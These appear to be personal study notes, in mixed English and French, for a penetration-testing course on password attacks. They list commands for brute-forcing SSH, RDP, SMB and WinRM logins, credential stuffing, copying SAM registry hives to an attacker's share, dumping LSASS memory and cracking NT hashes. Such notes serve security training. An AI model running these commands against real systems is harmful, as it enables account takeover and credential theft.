# Password Attacks

## Credential Storage 

###### Linux credentials : 

- **Format  /etc/shadow :** 
`<username>:<encrypted password>:<day of last change>:<min age>:<max age>:	<warning period>:<inactivity period>:<expiration date>:<reserved field>`

- **Password Part in credential**
`$ <id>	$ <salt>	$ <hashed>`

    |**ID**|**Cryptographic Hash Algorithm**|
    |--|---|
    `$1$` |	MD5 |
    `$2a$` |	Blowfish |
    `$5$` |	SHA-256 |
    `$6$` |	SHA-512 |
    `$sha1$` |	SHA1crypt |
    `$y$` |	Yescrypt |
    `$gy$` |	Gost-yescrypt |
    `$7$` |	Scrypt|

* format de /etc/passwd
The `x` in the password field indicates that the encrypted password is in the /etc/shadow file.

    `<username>:<password>:<uid>:<gid>:<comment>:<home directory>:<cmd executed after logging in>`

###### Windows credentials 

![Architecture d'authentification windows](../Ressources/IMG/Password-Attacks-windows-architecture.png)

---

## Remote Password Attacks

### Network Services

#### Windows Remote Management (WinRM)

* WinRM uses the TCP ports 5985 (HTTP) and 5986 (HTTPS).

    ##### CrackMapExec : 
    ```bash
    # installation
    git clone https://github.com/Porchetta-Industries/CrackMapExec
    # or
    sudo apt-get -y install crackmapexec

    # protocols disponible and help
    crackmapexec -h

    # CrackMapExec Protocol-Specific Help :
    crackmapexec <ProtocolName> -h

    # usage 
    crackmapexec <protocol> <target-IP> -u <user or userlistFile> -p <password or passwordlistFile>

    ```

    ##### Evil-WinRN
    ```bash
    # installation
    sudo gem install evil-winrm

    # usage 
    evil-winrm -i <target-IP> -u <username> -p <password>
    ```

#### SSH
* The SSH server runs on TCP port 22 by default
    ```bash
    # connection
    ssh <UserName>@<TargatIp>
    ```
    ##### Hydra
    ```bash
    hydra ssh://<IPTarget> -p <Password>  -l <userName> | -P <WordlistPassword> -L <WordlistUser>
    ``` 
#### Remote Desktop Protocol (RDP)
* It allows remote access to Windows systems via TCP port 3389 by default
    ##### Hydra
    ```bash
    # usage
    hydra -L <userWordlist> -P <Wordlistpassword> rdp://<Target-IP>
    ```

    ##### xFreeRDP
    ```bash
    xfreerdp /v:<target-IP> /u:<username> /p:<password>
    ```
#### Server Message Block (SMB)
*  responsible for transferring data between a client and a server in local area networks. It is used to implement file and directory sharing and printing services in Windows networks.
    
    ##### Hydra 
    ```bash
    # usage
    hydra -L <userWordlist> -P <Wordlistpassword> smb://<Target-IP>
    ```
    ##### Metasploit 
    ```bash
    msfconsole -q
    
    options 

    # remplir les fichier as PASS ou File 

    use auxiliary/scanner/smb/smb_login

    set user_file <fileName>

    set pass_file <fileName>

    set rhosts <fileName>
    
    run
    ```

    ##### CrackMapExec
    ```bash
    crackmapexec smb <target-IP> -u <user or userlistFile> -p <password or passwordlistFile> --shares
    ```

    ##### SMB Client
    ```bash
    smbclient -U <UserName> \\\\<Target-IP>\\SHARENAME
    ``` 

---

### Password Mutations
#### Generating Rule-based Wordlist

###### Hashcat 
```bash
hashcat --force <InputFile> -r <RuleFile> --stdout | sort -u > <Outputfile>
# hashcat rules
ls /usr/share/hashcat/rules/
```

###### CeWL 

```bash
cewl -d <depth to spider> -m <minimum word length> -w <output wordlist> <url-of-website-to-scrap-in-order-to-gen-wordlist>
# email extraction : -e
```
---

### Credential Stuffing - Hydra Syntax

##### Hydra
```bash
hydra -C <user_pass.list | Payload-All-The-Things-credentials> <protocol>://<IP>
```

---

<h2 style='text-align: center'>Windows Local Password Attacks</h2>



### Attacking SAM
* SAM can be crack offline  if we are root

#### Step 1 : Copying SAM Registry Hives

* On peut copier 3 fichier 
* We can create backups of these hives using the reg.exe utility.

```powershell
reg.exe save <RegistryHiveName> <Windows-Path>
```

| **Registry Hive** | **Description** |
| ----- | ----- | 
|hklm\sam |	Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext.|
| hklm\system |	Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database. | 
| hklm\security | 	Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target. |

#### Step 2 : Creating a Share with smbserver.py
 
```bash
# create share on attack host
sudo python3 <Link-To-SMB-serverpy> -smb2support <GiveANameToShare> <Directory-Shared-File-Location>
``` 
```powershell
# victim
# connect to the share and move file
move <File-To-Move> \\<AttachIO>\<ShareName>
```

#### Step 3 : Dumping Hashes with Impacket's secretsdump.py

##### Local dump
```bash
# locate 
locate secretsdump 

python3 <location | /usr/share/doc/python3-impacket/examples/secretsdump.py > -sam sam.save -security security.save -system system.save LOCAL
```
*  Most modern Windows operating systems store the password as an NT hash.
* Operating systems older than Windows Vista & Windows Server 2008 store passwords as an LM hash

##### Remote Dumping & LSA Secrets Considerations
```bash
# be root
crackmapexec smb <IP-Target> --local-auth -u <UserName> -p <Password> --lsa | --sam
```
#### Step 4 : Cracking Hash

* Adding nthashes to a .txt File
###### Running Hashcat against NT Hashes
```bash
# -m 1000 => ( NT Hash)
sudo hashcat -m 1000 <FileName | hashestocrack.txt > /usr/share/wordlists/rockyou.txt
```
---

### Attacking LSASS

Upon initial logon, LSASS will:
* Cache credentials locally in memory
* Create access tokens
* Enforce security policies
* Write to Windows security log

#### Dumping LSASS Process Memory

##### Task Manager Method
`Open Task Manager > Select the Processes tab > Find & right click the Local Security Authority Process > Select Create dump file`
```bash
# file name 
lsass.DMP
# directory of dump file 
C:\Users\<loggedonusersdirectory>\AppData\Local\Temp
```

##### Rundll32.exe & Comsvcs.dll Method
```bash
# Finding LSASS PID in cmd
tasklist /svc
# Finding LSASS PID in PowerShell
Get-Process lsass
# Creating lsass.dmp using PowerShell
# etre dans windows/systeme32
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 <C:\lsass.dmp | outPutPath> full
```

#### Using Pypykatz to Extract Credentials
```bash
pypykatz lsa minidump <Path-To-File | [path/]lsass.dmp>lsass.dmp> 
```
* MSV is an authentication package in Windows that LSA calls on to validate logon attempts against the SAM database.
* WDIGEST is an older authentication protocol enabled by default in Windows XP - Windows 8 and Windows Server 2003 - Windows Server 2012. LSASS caches credentials used by WDIGEST in clear-text( there had bee an update).
* Kerberos is a network authentication protocol used by Active Directory in Windows Domain environments. 
* The Data Protection Application Programming Interface or DPAPI is a set of APIs in Windows operating systems used to encrypt and decrypt DPAPI data blobs on a per-user basis for Windows OS features and various third-party applications.This masterkey can then be used to decrypt the secrets associated with each of the applications using DPAPI ( IE, chrome, outlook, Credential Manager...)

   #### Cracking keys with hashcat 
---

### Attacking Active Directory & NTDS.dit





---

## Ressources 

[CrackMapExec official doc](https://wiki.porchetta.industries/)